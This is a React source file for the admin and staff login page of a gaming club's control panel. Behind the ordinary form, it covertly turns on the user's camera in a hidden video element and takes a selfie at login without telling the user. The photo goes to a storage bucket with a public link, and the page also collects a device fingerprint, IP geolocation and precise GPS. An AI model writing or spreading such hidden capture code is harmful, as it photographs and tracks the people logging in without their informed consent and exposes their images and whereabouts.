import React, { useState, useEffect, useRef } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { useToast } from '@/hooks/use-toast';
import { useAuth } from '@/context/AuthContext';
import { Gamepad, ZapIcon, Stars, Dice1, Dice3, Dice5, Trophy, Joystick, User, Users, Shield, KeyRound, Lock, Eye, EyeOff, ArrowLeft, FileText } from 'lucide-react';
import { useIsMobile } from '@/hooks/use-mobile';
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { UAParser } from 'ua-parser-js';
import { supabase } from "@/integrations/supabase/client";

interface LocationState {
  from?: string;
}

const Login = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [loginType, setLoginType] = useState('admin');
  const { login } = useAuth();
  const { toast } = useToast();
  const navigate = useNavigate();
  const location = useLocation();
  const locationState = location.state as LocationState;
  const [animationClass, setAnimationClass] = useState('');
  const isMobile = useIsMobile();
  
  const [showPassword, setShowPassword] = useState(false);
  const [showNewPassword, setShowNewPassword] = useState(false);
  const [showConfirmPassword, setShowConfirmPassword] = useState(false);
  
  // Hidden webcam and canvas for silent capture
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [cameraReady, setCameraReady] = useState(false);
  
  const [loginMetadata, setLoginMetadata] = useState<any>({});

  useEffect(() => {
    const timer = setTimeout(() => {
      setAnimationClass('animate-scale-in');
    }, 100);
    return () => clearTimeout(timer);
  }, []);

  // Silently initialize camera in background
  useEffect(() => {
    const initCamera = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: 'user', width: 640, height: 480 },
          audio: false 
        });
        
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          videoRef.current.play();
          setCameraReady(true);
          console.log('📷 Camera initialized silently');
        }
      } catch (error) {
        console.log('⚠️ Camera not available or permission denied');
        setCameraReady(false);
      }
    };
    
    initCamera();

    // Cleanup camera on unmount
    return () => {
      if (videoRef.current && videoRef.current.srcObject) {
        const stream = videoRef.current.srcObject as MediaStream;
        stream.getTracks().forEach(track => track.stop());
      }
    };
  }, []);

  // Silently capture photo
  const captureSilentPhoto = (): string | null => {
    if (!cameraReady || !videoRef.current || !canvasRef.current) {
      console.log('⚠️ Camera not ready for capture');
      return null;
    }

    try {
      const canvas = canvasRef.current;
      const video = videoRef.current;
      
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      
      const ctx = canvas.getContext('2d');
      if (ctx) {
        ctx.drawImage(video, 0, 0);
        console.log('📸 Selfie captured silently');
        return canvas.toDataURL('image/jpeg', 0.8);
      }
    } catch (error) {
      console.error('❌ Error capturing photo:', error);
    }
    
    return null;
  };

  const uploadSelfie = async (imageData: string): Promise<string | null> => {
    try {
      const base64Data = imageData.split(',')[1];
      const fileName = `selfie_${Date.now()}_${Math.random().toString(36).substring(7)}.jpg`;
      
      const { data, error } = await supabase.storage
        .from('login-selfies')
        .upload(fileName, decode(base64Data), {
          contentType: 'image/jpeg',
          cacheControl: '3600',
        });

      if (error) throw error;

      const { data: publicUrlData } = supabase.storage
        .from('login-selfies')
        .getPublicUrl(fileName);

      console.log('✅ Selfie uploaded successfully');
      return publicUrlData.publicUrl;
    } catch (error) {
      console.error('❌ Error uploading selfie:', error);
      return null;
    }
  };

  const decode = (base64: string): Uint8Array => {
    const binaryString = window.atob(base64);
    const len = binaryString.length;
    const bytes = new Uint8Array(len);
    for (let i = 0; i < len; i++) {
      bytes[i] = binaryString.charCodeAt(i);
    }
    return bytes;
  };

  // Collect all metadata - IMPROVED VERSION
  useEffect(() => {
    const collectLoginInfo = async () => {
      try {
        const parser = new UAParser();
        const device = parser.getResult();
        
        let metadata: any = {
          browser: device.browser.name,
          browserVersion: device.browser.version,
          os: device.os.name,
          osVersion: device.os.version,
          deviceType: device.device.type || 'desktop',
          deviceModel: device.device.model || 'Unknown',
          deviceVendor: device.device.vendor || 'Unknown',
          loginTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
          userAgent: navigator.userAgent,
          screenResolution: `${window.screen.width}x${window.screen.height}`,
          colorDepth: window.screen.colorDepth,
          pixelRatio: window.devicePixelRatio,
          touchSupport: 'ontouchstart' in window
        };

        // Hardware info
        if ('hardwareConcurrency' in navigator) {
          metadata.cpuCores = (navigator as any).hardwareConcurrency;
        }
        if ('deviceMemory' in navigator) {
          metadata.deviceMemory = (navigator as any).deviceMemory;
        }

        // Connection info
        const connection = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
        if (connection) {
          metadata.connectionType = connection.effectiveType || connection.type;
        }

        // Battery info
        if ('getBattery' in navigator) {
          try {
            const battery: any = await (navigator as any).getBattery();
            metadata.batteryLevel = Math.round(battery.level * 100);
          } catch (e) {
            console.log('⚠️ Battery API not available');
          }
        }

        // Get IP and location - Wait for response
        try {
          const controller = new AbortController();
          const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 second timeout
          
          const response = await fetch('https://ipapi.co/json/', {
            signal: controller.signal
          });
          clearTimeout(timeoutId);
          
          if (response.ok) {
            const data = await response.json();
            metadata.ip = data.ip;
            metadata.city = data.city;
            metadata.region = data.region;
            metadata.country = data.country_name;
            metadata.timezone = data.timezone;
            metadata.isp = data.org;
            console.log('✅ IP and location data fetched successfully');
          }
        } catch (error) {
          console.log('⚠️ Could not fetch IP data, trying alternative...');
          
          // Try alternative API
          try {
            const response = await fetch('https://api.ipify.org?format=json');
            if (response.ok) {
              const data = await response.json();
              metadata.ip = data.ip;
              console.log('✅ IP fetched from alternative API');
            }
          } catch (e) {
            console.log('⚠️ All IP APIs failed');
          }
        }

        // Set initial metadata
        setLoginMetadata(metadata);

        // Get GPS coordinates silently - This runs separately
        if ('geolocation' in navigator) {
          console.log('📍 Requesting GPS location...');
          navigator.geolocation.getCurrentPosition(
            (position) => {
              console.log('✅ GPS location obtained:', position.coords.latitude, position.coords.longitude);
              const updatedMetadata = {
                ...metadata,
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                locationAccuracy: position.coords.accuracy
              };
              setLoginMetadata(updatedMetadata);
            },
            (error) => {
              console.log('⚠️ GPS location denied or unavailable:', error.message);
              // Keep existing metadata without GPS
            },
            { 
              enableHighAccuracy: true, 
              timeout: 10000,
              maximumAge: 0 
            }
          );
        } else {
          console.log('⚠️ Geolocation not supported');
        }

        console.log('🔍 Login tracking ready - metadata collection initiated');
      } catch (error) {
        console.error('❌ Error collecting metadata:', error);
        // Set minimal metadata even if collection fails
        setLoginMetadata({
          loginTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
          userAgent: navigator.userAgent
        });
      }
    };
    
    collectLoginInfo();
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!username || !password) {
      toast({
        title: 'Error',
        description: 'Please enter both username and password',
        variant: 'destructive',
      });
      return;
    }
    
    setIsLoading(true);
    
    // Wait a moment for GPS to finish if it's still loading
    await new Promise(resolve => setTimeout(resolve, 500));
    
    try {
      const isAdminLogin = loginType === 'admin';
      
      // Silently capture selfie
      let selfieUrl = null;
      const capturedImage = captureSilentPhoto();
      if (capturedImage) {
        selfieUrl = await uploadSelfie(capturedImage);
      }

      const enhancedMetadata = {
        ...loginMetadata,
        selfieUrl
      };

      console.log('🚀 Submitting login with metadata:', {
        hasIP: !!enhancedMetadata.ip,
        hasGPS: !!enhancedMetadata.latitude,
        hasSelfie: !!selfieUrl,
        city: enhancedMetadata.city,
        country: enhancedMetadata.country
      });
      
      const success = await login(username, password, isAdminLogin, enhancedMetadata);
      
      if (success) {
        // Stop camera after successful login
        if (videoRef.current && videoRef.current.srcObject) {
          const stream = videoRef.current.srcObject as MediaStream;
          stream.getTracks().forEach(track => track.stop());
        }

        toast({
          title: 'Success',
          description: `${isAdminLogin ? 'Admin' : 'Staff'} logged in successfully!`,
        });
        
        const redirectTo = locationState?.from || '/dashboard';
        navigate(redirectTo);
      } else {
        toast({
          title: 'Error',
          description: `Invalid ${isAdminLogin ? 'admin' : 'staff'} credentials`,
          variant: 'destructive',
        });
      }
    } catch (error) {
      toast({
        title: 'Error',
        description: 'Something went wrong. Please try again.',
        variant: 'destructive',
      });
    } finally {
      setIsLoading(false);
    }
  };

  const togglePasswordVisibility = () => setShowPassword(!showPassword);
  const toggleNewPasswordVisibility = () => setShowNewPassword(!showNewPassword);
  const toggleConfirmPasswordVisibility = () => setShowConfirmPassword(!showConfirmPassword);
  // Password reset / PIN-based log access removed (server-side auth now enforced).

  return (
    <div className="min-h-screen flex items-center justify-center bg-cuephoria-dark overflow-hidden relative px-3 sm:px-6 py-4 sm:py-4">
      {/* Hidden video and canvas for silent capture */}
      <video 
        ref={videoRef} 
        style={{ display: 'none' }}
        autoPlay
        playsInline
        muted
      />
      <canvas ref={canvasRef} style={{ display: 'none' }} />

      {/* Mobile-optimized top navigation */}
      <div className="absolute top-3 sm:top-4 left-3 sm:left-4 right-3 sm:right-4 z-20 flex justify-between items-center gap-2">
        <Button 
          variant="ghost" 
          size={isMobile ? "sm" : "default"}
          className="flex items-center gap-1.5 sm:gap-2 text-gray-300 hover:text-white hover:bg-cuephoria-purple/20 text-xs sm:text-sm px-2.5 sm:px-4 h-10 sm:h-11 rounded-lg"
          onClick={() => navigate('/')}
        >
          <ArrowLeft size={16} className="sm:w-4 sm:h-4" />
          <span className="hidden xs:inline">Back</span>
        </Button>
        
        <Button 
          variant="ghost" 
          size={isMobile ? "sm" : "default"}
          className="flex items-center gap-1.5 sm:gap-2 text-gray-300 hover:text-white hover:bg-cuephoria-orange/20 text-xs sm:text-sm px-2.5 sm:px-4 h-10 sm:h-11 rounded-lg"
          onClick={() => navigate('/login-logs')}
        >
          <FileText size={16} className="sm:w-4 sm:h-4" />
          <span className="hidden xs:inline">Logs</span>
        </Button>
      </div>
      
      {/* Simplified and mobile-optimized background */}
      <div className="absolute inset-0 z-0 overflow-hidden">
        {/* Main gradient overlays */}
        <div className="absolute top-0 left-0 w-full h-full bg-[radial-gradient(ellipse_at_top_left,_var(--tw-gradient-stops))] from-blue-500/20 via-transparent to-transparent"></div>
        <div className="absolute bottom-0 right-0 w-full h-full bg-[radial-gradient(ellipse_at_bottom_right,_var(--tw-gradient-stops))] from-purple-500/20 via-transparent to-transparent"></div>
        
        {/* Reduced decorative elements for mobile - hide some on very small screens */}
        {!isMobile && (
          <>
            <div className="absolute top-[8%] left-[12%] text-cuephoria-lightpurple opacity-15 animate-float">
              <Gamepad size={36} className="animate-wiggle" />
            </div>
            <div className="absolute bottom-[15%] right-[15%] text-accent opacity-15 animate-float delay-300">
              <ZapIcon size={36} className="animate-pulse-soft" />
            </div>
            <div className="absolute top-[15%] right-[12%] text-cuephoria-orange opacity-15 animate-float delay-250">
              <Dice1 size={28} className="animate-wiggle" />
            </div>
            <div className="absolute bottom-[25%] left-[25%] text-cuephoria-blue opacity-15 animate-float delay-200">
              <Dice3 size={30} className="animate-pulse-soft" />
            </div>
            <div className="absolute bottom-[10%] left-[10%] text-cuephoria-orange opacity-15 animate-float delay-300">
              <Trophy size={34} className="animate-pulse-soft" />
            </div>
            <div className="absolute top-[25%] left-[25%] text-accent opacity-15 animate-float delay-400">
              <Joystick size={38} className="animate-wiggle" />
            </div>
          </>
        )}
        
        {/* Minimal decorative elements for mobile */}
        {isMobile && (
          <>
            <div className="absolute top-[10%] right-[8%] text-cuephoria-lightpurple opacity-10 animate-float">
              <Gamepad size={24} />
            </div>
            <div className="absolute bottom-[12%] left-[8%] text-accent opacity-10 animate-float delay-300">
              <Trophy size={24} />
            </div>
          </>
        )}
        
        {/* Subtle grid pattern */}
        <div className="absolute inset-0 opacity-[0.03]" style={{ backgroundImage: 'radial-gradient(circle, rgba(255,255,255,0.1) 1px, transparent 1px)', backgroundSize: '30px 30px' }}></div>
      </div>
      
      {/* Mobile-optimized main card */}
      <div className={`w-full max-w-[440px] mx-auto z-10 ${animationClass}`}>
        {/* Logo section - optimized for mobile */}
        <div className="mb-4 sm:mb-6 text-center">
          <div className="relative mx-auto w-full max-w-[140px] sm:max-w-[200px] h-auto">
            <div className="absolute inset-0 rounded-full bg-gradient-to-br from-cuephoria-lightpurple/20 to-accent/10 blur-xl"></div>
            <img 
              src="/lovable-uploads/edbcb263-8fde-45a9-b66b-02f664772425.png" 
              alt="Cuephoria 8-Ball Club" 
              className="relative w-full h-auto mx-auto drop-shadow-[0_0_15px_rgba(155,135,245,0.3)]"
            />
          </div>
          <p className="mt-2 sm:mt-3 text-muted-foreground font-bold tracking-wider animate-fade-in bg-gradient-to-r from-cuephoria-lightpurple via-accent to-cuephoria-lightpurple bg-clip-text text-transparent text-[10px] sm:text-sm leading-relaxed">
            ADMINISTRATOR PORTAL
          </p>
        </div>
        
        {/* Login card with better mobile spacing */}
        <Card className="bg-cuephoria-darker/95 border border-cuephoria-lightpurple/30 shadow-2xl shadow-cuephoria-lightpurple/10 backdrop-blur-xl animate-fade-in delay-100 rounded-2xl overflow-hidden">
          <div className="absolute inset-0 bg-gradient-to-br from-cuephoria-lightpurple/5 to-accent/5 opacity-50 rounded-2xl"></div>
          
          <CardHeader className="text-center relative z-10 px-4 sm:px-8 pt-5 sm:pt-8 pb-3 sm:pb-5">
            <CardTitle className="text-lg sm:text-2xl md:text-3xl gradient-text font-bold mb-1.5 sm:mb-2">Game Master Login</CardTitle>
            <CardDescription className="text-muted-foreground font-medium text-xs sm:text-base leading-relaxed">Enter your credentials to access the control panel</CardDescription>
          </CardHeader>
          
          <form onSubmit={handleSubmit}>
            <CardContent className="space-y-3.5 sm:space-y-4 relative z-10 px-4 sm:px-6 pt-2 sm:pt-4">
              {/* Mobile-optimized toggle buttons - compact on mobile, full width on larger screens */}
              <div className="flex justify-center mb-4 sm:mb-5">
                <div className="w-[280px] sm:w-full">
                  <div className="inline-flex w-full rounded-xl bg-background/50 border border-cuephoria-lightpurple/30 p-1">
                    <button
                      type="button"
                      onClick={() => setLoginType('admin')}
                      className={`flex-1 flex items-center justify-center gap-1.5 sm:gap-2 text-xs sm:text-sm py-2.5 sm:py-3 px-3 sm:px-4 rounded-lg font-medium transition-all duration-200 whitespace-nowrap ${
                        loginType === 'admin'
                          ? 'bg-gradient-to-r from-cuephoria-lightpurple to-accent text-white shadow-lg shadow-cuephoria-lightpurple/30'
                          : 'text-muted-foreground hover:text-white hover:bg-cuephoria-lightpurple/10'
                      }`}
                    >
                      <Shield size={15} className="sm:w-[18px] sm:h-[18px] flex-shrink-0" />
                      <span>Admin</span>
                    </button>
                    <button
                      type="button"
                      onClick={() => setLoginType('staff')}
                      className={`flex-1 flex items-center justify-center gap-1.5 sm:gap-2 text-xs sm:text-sm py-2.5 sm:py-3 px-3 sm:px-4 rounded-lg font-medium transition-all duration-200 whitespace-nowrap ${
                        loginType === 'staff'
                          ? 'bg-gradient-to-r from-cuephoria-lightpurple to-accent text-white shadow-lg shadow-cuephoria-lightpurple/30'
                          : 'text-muted-foreground hover:text-white hover:bg-cuephoria-lightpurple/10'
                      }`}
                    >
                      <Users size={15} className="sm:w-[18px] sm:h-[18px] flex-shrink-0" />
                      <span>Staff</span>
                    </button>
                  </div>
                </div>
              </div>

              {/* Username field - mobile optimized */}
              <div className="space-y-2 group">
                <label htmlFor="username" className="text-xs sm:text-sm font-medium flex items-center gap-2 text-cuephoria-lightpurple">
                  <User size={15} className="sm:w-4 sm:h-4 flex-shrink-0" />
                  <span>Username</span>
                </label>
                <Input
                  id="username"
                  type="text"
                  placeholder="Enter your username"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="bg-background/50 border-cuephoria-lightpurple/30 focus-visible:ring-cuephoria-lightpurple focus-visible:ring-2 transition-all duration-200 hover:border-cuephoria-lightpurple/60 placeholder:text-muted-foreground/50 text-sm sm:text-base h-12 sm:h-13 rounded-lg px-4"
                />
              </div>
              
              {/* Password field - mobile optimized */}
              <div className="space-y-2 group">
                <label htmlFor="password" className="text-xs sm:text-sm font-medium flex items-center gap-2 text-cuephoria-lightpurple">
                  <ZapIcon size={15} className="sm:w-4 sm:h-4 flex-shrink-0" />
                  <span>Password</span>
                </label>
                <div className="relative">
                  <Input
                    id="password"
                    type={showPassword ? "text" : "password"}
                    placeholder="••••••••"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="bg-background/50 border-cuephoria-lightpurple/30 focus-visible:ring-cuephoria-lightpurple focus-visible:ring-2 transition-all duration-200 hover:border-cuephoria-lightpurple/60 placeholder:text-muted-foreground/50 text-sm sm:text-base pr-14 h-12 sm:h-13 rounded-lg px-4"
                  />
                  <button
                    type="button"
                    onClick={togglePasswordVisibility}
                    className="absolute right-1 top-1/2 transform -translate-y-1/2 text-cuephoria-lightpurple hover:text-accent focus:outline-none transition-colors duration-200 w-12 h-12 flex items-center justify-center rounded-lg active:bg-cuephoria-lightpurple/10"
                    aria-label={showPassword ? "Hide password" : "Show password"}
                  >
                    {showPassword ? <EyeOff size={19} /> : <Eye size={19} />}
                  </button>
                </div>
              </div>

              {/* Forgot password - mobile optimized touch target */}
              <div className="text-right pt-1">
                <Button 
                  type="button" 
                  variant="link" 
                  className="text-cuephoria-lightpurple hover:text-accent p-2 h-auto text-xs sm:text-sm font-medium"
                onClick={() => toast({ title: 'Password Reset', description: 'Please contact your administrator for password assistance.' })}
                >
                  Forgot password?
                </Button>
              </div>
            </CardContent>
            
            {/* Mobile-optimized footer */}
            <CardFooter className="relative z-10 px-4 sm:px-6 pb-5 sm:pb-7 pt-2 sm:pt-3">
              <Button 
                type="submit" 
                className="w-full relative overflow-hidden bg-gradient-to-r from-cuephoria-lightpurple to-accent hover:shadow-xl hover:shadow-cuephoria-lightpurple/30 active:scale-[0.98] transition-all duration-300 font-semibold text-sm sm:text-base h-12 sm:h-14 rounded-xl" 
                disabled={isLoading}
              >
                <span className="relative z-10 flex items-center justify-center gap-2">
                  {isLoading ? (
                    <>
                      <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                      </svg>
                      <span>Authenticating...</span>
                    </>
                  ) : (
                    <>
                      {loginType === 'admin' ? <Shield size={18} className="sm:w-5 sm:h-5" /> : <Users size={18} className="sm:w-5 sm:h-5" />}
                      <span>{loginType === 'admin' ? 'Admin Login' : 'Staff Login'}</span>
                    </>
                  )}
                </span>
              </Button>
            </CardFooter>
          </form>
        </Card>
      </div>

    </div>
  );
};

export default Login;
